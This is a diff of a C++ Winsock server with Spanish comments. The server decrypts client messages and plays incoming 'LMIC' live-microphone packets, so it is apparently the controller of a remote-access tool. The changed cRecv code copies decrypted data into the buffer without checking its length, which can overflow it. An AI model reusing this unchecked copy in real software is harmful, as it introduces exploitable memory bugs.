@@ -273,9 +273,8 @@ void Servidor::m_Escucha(){
                 
             } else {
                 //Datos de algun cliente :v
-                char cBuffer[4096];
-                //ZeroMemory(cBuffer, sizeof(cBuffer));
-
+                char cBuffer[5000];
+                
                 int iRecibido = this->cRecv(iSock, cBuffer, sizeof(cBuffer), 0, false);
                 
                 if (iRecibido == WSAECONNRESET) {
@@ -300,11 +299,11 @@ void Servidor::m_Escucha(){
                     closesocket(iSock);
                     FD_CLR(iSock, &fdMaster);
                 } else {
-                    //std::cout << cBuffer << std::endl;
-                    std::vector<std::string> vcDatos = strSplit(std::string(cBuffer), '\\', 10000); //maximo 5 por ahora, pero se deberia de incrementar en un futuro
+                    
+                    std::vector<std::string> vcDatos = strSplit(std::string(cBuffer), '\\', 100); //maximo 5 por ahora, pero se deberia de incrementar en un futuro
 
                     if (vcDatos.size() == 0) {
-                        std::cout << "No su pudo procesa:<<< " << cBuffer << std::endl;
+                        std::cout << "No su pudo procesar :<<< " << cBuffer << std::endl;
                         continue;
                     }
 
@@ -435,17 +434,13 @@ void Servidor::m_Escucha(){
                         }
                     }
 
-                    if (vcDatos[0] == std::to_string(EnumComandos::Mic_Live_Packet)) {
+                    if (vcDatos[0] == "LMIC") {
                         //Siempre escucha el mic por defecto, 
                         //implementar que escucha por el dispositivo seleccionado en el combobox
                         
-                        char* nBuffer = cBuffer;
-                        if (nBuffer != nullptr) {
-                            std::cout << "Got " << iRecibido-4 << " voice\n";
-                            int iAudioSize = sizeof(cBuffer) - (nBuffer - cBuffer) - 4;
-                            std::cout << iAudioSize - 4 << "\n";
-                            this->m_ReproducirPaquete(nBuffer+4, iAudioSize-4);
-                        }
+                        //Solo reproducir por ahora, no importa de quien venga
+                        std::cout << "AUDIO " << iRecibido<< " bytes" << std::endl;
+                        this->m_ReproducirPaquete(cBuffer + 5, iRecibido - 5);
                     }
                 }
             }
@@ -461,7 +456,7 @@ void Servidor::m_ReproducirPaquete(char* pBuffer, size_t iLen) {
     WAVEFORMATEX wfx = {};
     wfx.wFormatTag = WAVE_FORMAT_PCM;
     wfx.nChannels = 2;
-    wfx.nSamplesPerSec = 44100;
+    wfx.nSamplesPerSec = 2000; // 2.0khz
     wfx.wBitsPerSample = 16;
     wfx.nBlockAlign = wfx.wBitsPerSample * wfx.nChannels / 8;
     wfx.nAvgBytesPerSec = wfx.nBlockAlign * wfx.nSamplesPerSec;
@@ -578,15 +573,11 @@ int Servidor::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool i
         //Decrypt
         ByteArray bOut = this->bDec((const unsigned char*)cTmpBuff, iRecibido);
 
-        std::string strOut = "";
-        //set a 0 para volver a contar los bytes
-        iRecibido = 0;
-        for (auto c : bOut) {
-            strOut.append(1, c);
-            iRecibido++;
+        iRecibido = bOut.size();
+        for (int iBytePos = 0; iBytePos < iRecibido; iBytePos++) {
+            std::memcpy(pBuffer + iBytePos, &bOut[iBytePos], 1);
         }
-        _memccpy(pBuffer, strOut.c_str(), '\0', 1024);
-
+        
         //Restaurar
         iBlock = 1;
         if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
@@ -619,13 +610,10 @@ int Servidor::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool i
 
         ByteArray bOut = this->bDec((const unsigned char*)cTmpBuff, iRecibido);
 
-        std::string strOut = "";
-        iRecibido = 0;
-        for (auto c : bOut) {
-            strOut.append(1, c);
-            iRecibido++;
+        iRecibido = bOut.size();
+        for (int iBytePos = 0; iBytePos < iRecibido; iBytePos++) {
+            std::memcpy(pBuffer + iBytePos, &bOut[iBytePos], 1);
         }
-        memccpy(pBuffer, strOut.c_str(), '\0', 1024);
 
         if (cTmpBuff) {
             ZeroMemory(cTmpBuff, pLen);
